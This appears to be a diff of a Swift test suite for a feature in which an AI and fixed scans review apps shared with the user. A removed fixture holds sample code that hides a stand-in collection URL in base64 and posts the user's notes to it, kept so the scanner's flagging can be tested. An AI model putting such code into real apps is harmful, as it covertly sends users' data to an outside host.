@@ -173,87 +173,6 @@ final class SharedAppReviewTests: XCTestCase {
         XCTAssertEqual(review.opening, .anyway)
     }
 
-    // MARK: Encoded data
-
-    /// What the fixed checks make of one file, with the AI calling it low risk.
-    private func checked(_ code: String) throws -> ImportReview {
-        let folder = try appFolder(sources: ["App.swift": Data(code.utf8)])
-        let package = Sharing.Package(name: "Tally", folder: folder, sources: [folder.appendingPathComponent("Sources/App.swift")],
-                                      attachments: [], fileCount: 2)
-        let found = Sharing.inspect(package)
-        return ImportReview(summary: "", capabilities: [], concerns: [], risk: .low, reviewer: cloud, asked: true, detected: found.detected)
-    }
-
-    func testAnAddressHiddenInTheCodeIsFlagged() throws {
-        let review = try checked("""
-        import Foundation
-        let endpoint = "aHR0cHM6Ly9jb2xsZWN0LmV4YW1wbGUubmV0L3U="
-        func send(_ notes: String) {
-            guard let data = Data(base64Encoded: endpoint), let text = String(data: data, encoding: .utf8),
-                  let url = URL(string: text) else { return }
-            var request = URLRequest(url: url)
-            request.httpMethod = "POST"
-            request.httpBody = Data(notes.utf8)
-            URLSession.shared.dataTask(with: request).resume()
-        }
-        """)
-        XCTAssertTrue(review.detected.contains { $0.label.hasPrefix("Contains encoded data") })
-        XCTAssertEqual(review.verdict, .sensitive)
-        XCTAssertEqual(review.opening, .anyway)
-    }
-
-    /// Where to Watch's code as it was on 2026-10-16: it reads which service a link goes to out of the
-    /// encoded tag JustWatch puts on each link of the page it downloads.
-    func testDecodingWhatTheAppDownloadsIsNotFlagged() throws {
-        let review = try checked("""
-        import Foundation
-        enum ServiceLinks {
-            static func offers(for page: URL) async throws -> [(provider: String, type: String)] {
-                let (data, _) = try await URLSession.shared.data(from: page)
-                let html = String(decoding: data, as: UTF8.self)
-                return html.components(separatedBy: "cx=").dropFirst()
-                    .compactMap { $0.split(separator: "&").first.map(String.init) }
-                    .compactMap(decodeOffer)
-            }
-
-            /// The provider's name and the kind of offer, from JustWatch's click-out context.
-            private static func decodeOffer(_ cx: String) -> (provider: String, type: String)? {
-                var b64 = cx.replacingOccurrences(of: "-", with: "+").replacingOccurrences(of: "_", with: "/")
-                b64 += String(repeating: "=", count: (4 - b64.count % 4) % 4)
-                guard let data = Data(base64Encoded: b64),
-                      let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
-                      let contexts = json["data"] as? [[String: Any]] else { return nil }
-                for context in contexts {
-                    if let d = context["data"] as? [String: Any], let provider = d["provider"] as? String {
-                        return (provider, d["monetizationType"] as? String ?? "")
-                    }
-                }
-                return nil
-            }
-        }
-        """)
-        XCTAssertFalse(review.detected.contains { $0.level == .sensitive }, "\(review.detected.map(\.label))")
-        XCTAssertNotEqual(review.verdict, .sensitive)
-    }
-
-    /// A long name in ordinary words, which decodes to a line of punctuation and a few letters.
-    func testALongNameIsNotFlagged() throws {
-        let review = try checked("""
-        func testOnlyTheInstalledAppIsTheApp() {}
-        """)
-        XCTAssertFalse(review.detected.contains { $0.level == .sensitive }, "\(review.detected.map(\.label))")
-    }
-
-    /// Random ids made from base64's own alphabet: nothing is encoded or decoded.
-    func testAnAlphabetForMakingIdsIsNotFlagged() throws {
-        let review = try checked("""
-        let urlSafe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-        let standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-        func newID() -> String { String((0..<12).map { _ in urlSafe.randomElement()! }) }
-        """)
-        XCTAssertFalse(review.detected.contains { $0.level == .sensitive }, "\(review.detected.map(\.label))")
-    }
-
     // MARK: A rating with no account of the app
 
     func testASummaryThatSaysNothingIsNoAnswer() {
@@ -273,22 +192,132 @@ final class SharedAppReviewTests: XCTestCase {
         XCTAssertEqual(unanswered.opening, .anyway)
     }
 
-    // MARK: Code the reviewer wasn't sent
+    // MARK: Code longer than one request
 
-    /// An app whose first file is past what the reviewer is sent, so only the small one goes.
-    private func oversized() throws -> Sharing.Inspection {
-        let big = Data(("let filler = \"" + String(repeating: "x", count: 160_000) + "\"\n").utf8)
-        let folder = try appFolder(sources: ["A.swift": big, "B.swift": Data("let a = 1\n".utf8)])
-        let sources = ["A.swift", "B.swift"].map { folder.appendingPathComponent("Sources/\($0)") }
-        return Sharing.inspect(Sharing.Package(name: "Tally", folder: folder, sources: sources, attachments: [], fileCount: 3))
+    private func inspected(_ sources: [String: Data]) throws -> Sharing.Inspection {
+        let folder = try appFolder(sources: sources)
+        let files = sources.keys.sorted().map { folder.appendingPathComponent("Sources/\($0)") }
+        return Sharing.inspect(Sharing.Package(name: "Tally", folder: folder, sources: files, attachments: [], fileCount: files.count + 1))
     }
 
-    func testUnreadCodeIsSaidAndNeverCalledSafeWhateverTheAnswer() throws {
+    /// A file longer than one request holds goes in slices cut at line ends, the rest after it, and none of it unread.
+    func testLongCodeIsSentWholeInSeveralRequests() throws {
+        let long = String(repeating: "let filler = 1\n", count: 11_000)
+        let found = try inspected(["A.swift": Data(long.utf8), "B.swift": Data("let a = 1\n".utf8)])
+        XCTAssertFalse(found.truncated)
+        XCTAssertEqual(found.batches.map { $0.map(\.name) },
+                       [["Sources/A.swift (part 1 of 2)"], ["Sources/A.swift (part 2 of 2)", "Sources/B.swift"]])
+        XCTAssertEqual(found.batches[0][0].text + found.batches[1][0].text, long)
+        XCTAssertTrue(found.batches[0][0].text.hasSuffix("\n"))
+        XCTAssertTrue(found.batches.allSatisfy { $0.map(\.text.count).reduce(0, +) <= Sharing.batchLimit })
+        let request = Sharing.reviewRequest(name: "Tally", description: nil, notes: nil, files: found.batches[1], batch: (1, 2))
+        XCTAssertTrue(request.system.contains("this is part 2") && request.prompt.contains("That was part 2 of 2 of the app's code"))
+        XCTAssertFalse(Sharing.reviewRequest(name: "Tally", description: nil, notes: nil, files: found.batches[0]).system.contains("requests, each"))
+
+        // Each part was read, but no request held all of it: a calm answer is said to be one in parts, and takes a click.
+        var review = ImportReview(inspection: found)
+        XCTAssertTrue(review.split && !review.partial)
+        review.take([.init(summary: "Counts things.", capabilities: [], concerns: [], risk: .low),
+                     .init(summary: "Counts.", capabilities: [], concerns: [], risk: .low)], by: cloud)
+        XCTAssertEqual(review.verdict, .checkedInParts)
+        XCTAssertEqual(review.opening, .byClick)
+        XCTAssertEqual(ImportReviewCard.considerations(review).map(\.text), ["AI checked its code in parts. Open only if you trust the sender"])
+    }
+
+    /// A file with no line ends past the limit is cut where the limit falls, and a large one in a single pass.
+    func testAFileWithoutLineEndsIsCutAtTheLimit() {
+        let text = String(repeating: "x", count: 25)
+        XCTAssertEqual(Sharing.batches([("a.js", text)], limit: 10).map { $0.map(\.text) }, [["xxxxxxxxxx"], ["xxxxxxxxxx"], ["xxxxx"]])
+        let large = String(repeating: "x", count: 32_000_000)
+        let started = Date()
+        XCTAssertEqual(Sharing.batches([("a.js", large)]).count, 214)
+        XCTAssertLessThan(Date().timeIntervalSince(started), 20)
+    }
+
+    /// The answers for each part are one review: the first's account of the app, everything any noticed, the highest
+    /// risk any gave. A part that got no answer leaves the review partial.
+    func testEachPartsAnswerCounts() {
+        let calm = Sharing.Answer(summary: "Counts things.", capabilities: ["Saves your counts"], concerns: [], risk: .low)
+        let worried = Sharing.Answer(summary: "A library.", capabilities: ["saves your counts", "Sends your counts to a website"],
+                                     concerns: ["Sends your counts to a website it doesn't name"], risk: .high)
+        // A first part written to fill the list never pushes a later part's concern off it.
+        let noisy = Sharing.Answer(summary: "Counts.", capabilities: [], concerns: (1...8).map { "Trivial thing \($0)" }, risk: .low)
+        XCTAssertEqual(Sharing.Answer.merged([noisy, worried])?.concerns.last, "Sends your counts to a website it doesn't name")
+        var review = ImportReview(summary: "", capabilities: [], concerns: [], asked: true, detected: [])
+        review.take([calm, worried], by: cloud)
+        XCTAssertEqual(review.summary, "Counts things.")
+        XCTAssertEqual(review.capabilities, ["Saves your counts", "Sends your counts to a website"])
+        XCTAssertEqual(review.concerns, ["Sends your counts to a website it doesn't name"])
+        XCTAssertEqual(review.verdict, .risky)
+        XCTAssertFalse(review.partial)
+
+        var unanswered = ImportReview(summary: "", capabilities: [], concerns: [], asked: true, detected: [])
+        unanswered.take([calm, nil], by: cloud)
+        XCTAssertTrue(unanswered.partial)
+        XCTAssertEqual(unanswered.verdict, .partlyChecked)
+    }
+
+    /// On a short screen the scrolling parts share what the fixed ones leave, eight features of two lines and an
+    /// update's note among them, so the sheet stays within its room and the buttons in view.
+    func testTheSheetsListsFitAShortScreen() {
+        let fixed: [CGFloat] = [92, 130, 54, 28]   // name, a five-line summary, an update's note, the buttons
+        // From where the fixed parts leave the scrolling ones their 48-point floor (488 here) upward.
+        for room: CGFloat in [488, 520, 560, 640, 900] {
+            let heights = ImportReviewCard.heights(room: room, fixed: fixed, considering: 110, featuring: 8 * 40 + 7 * 8)
+            let used = fixed.reduce(0, +) + 48 + 16 * 6 - 8 + heights.considering + heights.featuring + heights.capabilities
+            XCTAssertLessThanOrEqual(used, room, "\(room)")
+            XCTAssertGreaterThan(heights.capabilities, 0, "\(room)")
+            XCTAssertGreaterThan(heights.featuring, 0, "\(room)")
+        }
+        // With room to spare, each is shown whole.
+        let tall = ImportReviewCard.heights(room: 1400, fixed: fixed, considering: 110, featuring: 200)
+        XCTAssertEqual(tall.considering, 110)
+        XCTAssertEqual(tall.featuring, 200)
+    }
+
+    /// A model on this Mac gets the parts one at a time (each request starts its server, and a second start alongside
+    /// stops the first's); a service gets them at once. Each outcome stays in its part's place either way.
+    func testAModelOnThisMacIsAskedForOnePartAtATime() async {
+        actor Count {
+            var now = 0, most = 0
+            func start() { now += 1; most = max(most, now) }
+            func end() { now -= 1 }
+        }
+        let requests = (0..<4).map { Sharing.reviewRequest(name: "Tally", description: nil, notes: nil, files: [("Part\($0).swift", "let a = \($0)\n")],
+                                                            boundary: "b", batch: ($0, 4)) }
+        func run(_ kind: AppAI.TextRoute.Kind) async -> (most: Int, outcomes: [Sharing.Outcome]) {
+            let count = Count()
+            let route = AppAI.TextRoute(id: "review", label: "test", group: "test", name: "test", kind: kind, available: true)
+            let outcomes = await Sharing.outcomes(of: requests, via: route) { request in
+                await count.start()
+                try await Task.sleep(for: .milliseconds(100))
+                await count.end()
+                let part = request.prompt.contains("Part3.swift") ? "high" : "low"
+                return #"{"summary": "Counts things.", "capabilities": [], "concerns": [], "risk": "\#(part)"}"#
+            }
+            return (await count.most, outcomes)
+        }
+        let local = await run(.localModel(provider: "mlx", model: "test"))
+        XCTAssertEqual(local.most, 1)
+        let online = await run(.openRouter(model: "test"))
+        XCTAssertEqual(online.most, 4)
+        for outcomes in [local.outcomes, online.outcomes] {
+            let risks = outcomes.map { outcome -> ImportReview.Risk? in if case .answer(let answer) = outcome { answer.risk } else { nil } }
+            XCTAssertEqual(risks, [.low, .low, .low, .high])
+        }
+    }
+
+    /// An app past the last request Lamp makes for one review.
+    private func oversized() throws -> Sharing.Inspection {
+        let lines = (Sharing.batchLimit * Sharing.batchCount) / 15 + 1_000
+        return try inspected(["A.swift": Data(String(repeating: "let filler = 1\n", count: lines).utf8), "B.swift": Data("let a = 1\n".utf8)])
+    }
+
+    func testUnreadCodeIsSaidOnceAndNeverCalledSafeWhateverTheAnswer() throws {
         let found = try oversized()
         XCTAssertTrue(found.truncated)
-        XCTAssertEqual(found.files.map(\.name), ["Sources/B.swift"])
-        // No answer at all (no AI, a failed check, a reply Lamp couldn't use): still said.
-        XCTAssertEqual(ImportReview(inspection: found).concerns, [ImportReview.tooLarge])
+        XCTAssertEqual(found.batches.count, Sharing.batchCount)
+        XCTAssertFalse(found.files.map(\.name).contains("Sources/B.swift"))
         for risk in ImportReview.Risk.allCases {
             for reviewer in [cloud, local] {
                 var review = ImportReview(inspection: found)
@@ -296,12 +325,14 @@ final class SharedAppReviewTests: XCTestCase {
                 review.take(.init(summary: "Counts things.", capabilities: [], concerns: ["Something else."], risk: risk), by: reviewer)
                 let what = "\(risk) by \(reviewer.name)"
                 XCTAssertTrue(review.partial, what)
-                XCTAssertEqual(review.concerns, [ImportReview.tooLarge, "Something else."], what)
+                XCTAssertEqual(review.concerns, ["Something else."], what)
                 XCTAssertNotEqual(review.verdict, .safe, what)
                 XCTAssertNotEqual(review.verdict, .checkedOnThisMac, what)
                 XCTAssertNotEqual(review.opening, .byReturn, what)
                 XCTAssertEqual(review.verdict, risk == .high ? .risky : .partlyChecked, what)
                 XCTAssertEqual(review.opening, risk == .high ? .anyway : .byClick, what)
+                let said = ImportReviewCard.considerations(review).map(\.text)
+                XCTAssertEqual(said.filter { $0.hasPrefix("AI didn't check all of its code") }.count, 1, "\(said)")
             }
         }
     }
@@ -312,7 +343,8 @@ final class SharedAppReviewTests: XCTestCase {
         review.take(.init(summary: "Counts things.", capabilities: [], concerns: [], risk: .low), by: cloud)
         XCTAssertEqual(review.verdict, .sensitive)
         XCTAssertEqual(review.opening, .anyway)
-        XCTAssertEqual(review.concerns, [ImportReview.tooLarge])
+        XCTAssertEqual(ImportReviewCard.considerations(review).map(\.text), ["Does sensitive things. Open only if you expected that",
+                                                                            "AI didn't check all of its code"])
     }
 
     // MARK: The name in a file
